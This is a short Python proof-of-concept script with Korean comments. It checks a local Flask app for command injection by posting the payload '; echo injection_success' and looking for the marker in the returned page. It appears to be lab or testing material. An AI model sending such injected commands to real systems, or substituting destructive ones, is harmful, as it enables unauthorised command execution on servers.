import requests

# Flask 애플리케이션이 실행 중인 URL (예: http://localhost:5000/)
url = "http://localhost:5000/"

def inject_payload(payload):
    """
    사용자가 입력한 payload를 게시물(post)로 전송하여, 명령어 주입을 시도합니다.
    """
    response = requests.post(url, data={"post": payload})
    return response

def check_command_injection():
    """
    명령어 주입 취약점이 존재하는지 확인합니다.
    payload를 통해 'injection_success'라는 문자열이 실행 결과에 포함되면 취약점이 존재하는 것으로 판단합니다.
    """
    # 공격 페이로드: 기본 명령어인 ls 뒤에 ; echo injection_success가 추가됩니다.
    injection_payload = "; echo injection_success"
    
    # 페이로드 주입
    inject_payload(injection_payload)
    
    # 게시물(명령어 실행 결과)을 포함한 페이지를 GET 요청하여 결과를 확인
    res = requests.get(url)
    
    if "injection_success" in res.text:
        return True
    return False

if __name__ == "__main__":
    if check_command_injection():
        print("[+] PoC 성공: 명령어 주입 취약점 존재!")
    else:
        print("[-] PoC 실패: 취약점 없음!")
